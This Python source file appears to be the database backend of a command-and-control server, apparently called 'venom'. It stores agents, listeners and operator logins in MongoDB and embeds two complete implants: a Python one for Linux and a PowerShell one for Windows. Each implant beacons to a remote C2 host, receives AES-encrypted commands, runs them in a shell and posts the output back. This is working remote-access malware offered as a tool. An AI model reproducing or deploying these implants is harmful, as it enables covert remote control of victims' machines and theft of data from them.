from pymongo import MongoClient
from hashlib import sha256

client = MongoClient('mongodb://localhost:27017/')
db = client.C2

''' 
To-Do: 
1- Handle bad requested tasks (bad commands) (Done)
2- Delete the task after writing its result (Done) 
3- Check how subprocess.Popen supports stderr return (Done)
4- Variable Interval timeout
'''

def registerAgent(agentID, type, bindListenerID, port, timeout = 60):

    agent = {'id': agentID, 
             'port': port,
             'type': type,
             'status': 'dead',
             'task': '',
             'taskResult': '',
             'bindListenerID': bindListenerID,
             'ip': '', 
             'timeout': timeout
             }

    db.agents.insert_one(agent)


def deleteAgent(agentID):
    db.agents.delete_one({'id': {'$eq': agentID}})


def saveListener(listenerId, port, key):
    listener = {'id': listenerId,
                'port': port,
                'key': key}
    db.listeners.insert_one(listener)


def getListener(id):
    return db.listeners.find_one({'id': {'$eq': id}})


def getListeners():
    return db.listeners.find()


def delListener(id):

    if(db.listeners.find_one({'id': {'$eq': id}})):
        db.listeners.delete_one({'id': {'$eq': id}})
        return True
    else:
        return False

def checkTask(agentID):
    task = db.agents.find_one({'id': {'$eq': agentID}}).get('task')

    if (task):
        return task

    else:
        return 


def clearTask(agentID):
    db.agents.update_one({
        'id': agentID
    }, {
        '$set': {
            'task': ''
        }
    })

def clearTaskResult(agentID):
    db.agents.update_one({
        'id': agentID
    }, {
        '$set': {
            'taskResult': ''
        }
    })


def assignTask(agentID, task):

    db.agents.update_one({
        'id': agentID
    }, {
        '$set': {
            'task': task
        }
    })


def writeResult(agentID, result):
    db.agents.update_one({
        'id': agentID},
        {
        '$set': {
            'taskResult': result
        }
    })


def readTaskResult(agentID): 
    return db.agents.find_one({
        'id': { 
          '$eq': agentID  
        }
    }).get('taskResult')


def getKey(id):
    return db.listeners.find_one({
        'id': {
            '$eq': id}
    }).get('key')


def checkListenerPort(port):
    return db.listeners.find_one({
        'port': {
            '$eq': port}
    })

def getAgentListener(agentID):
    return db.agents.find_one({
        'id': {
            '$eq': agentID}
    }).get('bindListenerID')

def getAgent(agentID): 
    return db.agents.find_one({ 
        'id': { 
            '$eq': agentID
        }

    }) 

def getAgents():
    return db.agents.find()

def login(email, password): 
    if db.operators.find_one({'email': {'$eq': email}, 'password': {'$eq': sha256(password.encode('utf-8')).hexdigest()}}): 
        return True
    else: 
        return False    

def register(email, password): 
    db.operators.insert_one({ 
            'email': email, 
            'password': sha256(password.encode('utf-8')).hexdigest()
        }) 


def getImplant(type): 
    return db.implants.find_one({'type': {'$eq' : type }}).get('implant')

implant_linux = '''import requests as r 
from base64 import b64encode, b64decode 
from random import seed
from random import randint
from time import sleep
import os
import subprocess
#encryption libraries
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from requests.packages.urllib3.exceptions import InsecureRequestWarning

_IP_ = 'REPLACE_IP'
_PORT_ = 'REPLACE_PORT'
_ID_ = 'REPLACE_ID' 
_KEY_ = 'REPLACE_KEY'
_SCHEME_ = 'REPLACE_SCHEME'

#add encrytion and decryption FCNs
def encrypt(task):
    base64_bytes = _KEY_.encode("ascii")
    key = b64decode(base64_bytes)
    IV = os.urandom(16)
    c = AES.new(key, AES.MODE_CBC, IV)
    ct = IV + c.encrypt(pad(bytes(task, 'utf-8'),AES.block_size))
    base64_bytes = b64encode(ct)
    cipher = base64_bytes.decode("ascii")
    return cipher


def decrypt(eresult):
    base64_bytes = _KEY_.encode("ascii")
    key = b64decode(base64_bytes)
    base64_bytes = eresult.encode("ascii")
    result = b64decode(base64_bytes)
    IV = result[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, IV)
    pt = cipher.decrypt(result[AES.block_size:])
    pt = unpad(pt,16).decode('utf-8')
    return pt
    

if __name__ == "__main__": 

    r.packages.urllib3.disable_warnings(InsecureRequestWarning)
    _C2_ = _SCHEME_ + "://{}:{}".format(_IP_,_PORT_)    
    #Start Registration 
    while (True): 
        seed()
        sleep(randint(0,20)) 
        response = r.get(url = _C2_ + "/reg/{}".format(_ID_), verify=False)  
        if ("Success" in response.text): 
            break 
        
        else: 
            continue 
    
    #Start Beaconing 
    while (True): 
        seed()
        sleep(randint(0,20)) 
        task = r.get(url = _C2_ + "/task/{}".format(_ID_), verify=False) 
        #add aliases for reverse shell and purging  
        if (task.text): 
            cmd = subprocess.Popen(decrypt(task.text), shell = True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
            output,err = cmd.communicate()
            if(output.decode('UTF-8') != ''):
                result = output.decode('UTF-8')
            elif (err.decode('UTF-8') != ''): 
                result = err.decode('UTF-8')
            else:
                result = "Task completed but has no output"
            result = encrypt(result)
            
            r.post(url = _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('utf-8'), verify=False) 
         
        else: 
            continue'''


implant_windows = '''function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
	
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $bytess = $bytes.length
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytess);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $bytess = $bytes.Length - 16;
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytess);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    
}
function Convert-ASCII($ascii) {
	$letter = @()
	foreach ($char in $ascii){
	$char = [int[]]$char
	$letter += [char[]]$char
	}
	$final = ("$letter").Replace(" ","")
	Return $final
}


$ip = "REPLACE_IP"
$port = "REPLACE_PORT"
$id = "REPLACE_ID"
$key = "REPLACE_KEY"
$scheme = "REPLACE_SCHEME"
$reguri = ($scheme + ':' + "//$ip" + ':' + "$port/reg/$id")
$name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET').Content
$name=Convert-ASCII($name)
if ($name -eq "Success"){
$taskuri = ($scheme + ':' + "//$ip" + ':' + "$port/task/$id")
$responseuri = ($scheme + ':' + "//$ip" + ':' + "$port/task/results/$id")
for (;;) {
$n  = Get-Random -Maximum 20
$task = (Invoke-WebRequest -UseBasicParsing -Uri $taskuri  -Method 'GET').Content
$task=Convert-ASCII($task)

if ($task -ne "") {
$dtask = Decrypt-String $key $task
$res = cmd.exe /c $dtask
$data = Encrypt-String $key $res
$response = (Invoke-WebRequest -UseBasicParsing -Uri $responseuri -body $data -ContentType "text/plain; charset=utf-8" -Method 'POST').Content
    }
sleep $n
} }'''

def migrate(password): 
    db.listeners.delete_many({}) 
    db.agents.delete_many({})
    try: 
        db.operators.delete_one({'email': {'$eq': 'venom@venom.local'}}) 
    except: 
        pass    
    db.operators.insert_one({ 
            'email': 'venom@venom.local', 
            'password': sha256(password.encode('utf-8')).hexdigest()
        }) 
    if not db.implants.find_one({'type': 'Linux' }):
        db.implants.insert_one({'implant': implant_linux, 'type': 'Linux'}) 
    if not db.implants.find_one({'type': 'Windows' }):
        db.implants.insert_one({'implant': implant_windows, 'type': 'Windows'})
